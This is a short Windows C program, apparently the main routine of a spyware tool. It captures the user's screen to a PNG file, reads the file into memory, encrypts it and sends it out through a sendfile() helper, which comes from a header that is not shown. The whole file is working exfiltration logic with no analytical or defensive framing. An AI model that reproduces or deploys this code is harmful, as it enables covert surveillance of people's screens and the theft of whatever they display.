#include <Windows.h>
#include "screenshot.h"
#include "sendfile.h"
#include "crypto.h"

int main(int argc, char* argv[]) {
	HANDLE screenshot = NULL;
	DWORD fileSize, fileSizeHigh, dwBytesRead;
	BYTE* data = NULL;
	const WCHAR* filename = L"C:\\tmp\\Screenshot.png";
	take_screenshot(filename);

	screenshot = CreateFile(filename, 
		GENERIC_READ, 
		FILE_READ_ACCESS, 
		0, 
		OPEN_EXISTING, 
		FILE_ATTRIBUTE_NORMAL, 
		NULL);
	fileSize = GetFileSize(screenshot, &fileSizeHigh);
	data = (BYTE*)malloc(fileSize);

	if (!ReadFile(screenshot, data, fileSize, &dwBytesRead, NULL)) {
		return 0;
	}
	encrypt(data, fileSize);

	sendfile(data, fileSize);

	return 1;

}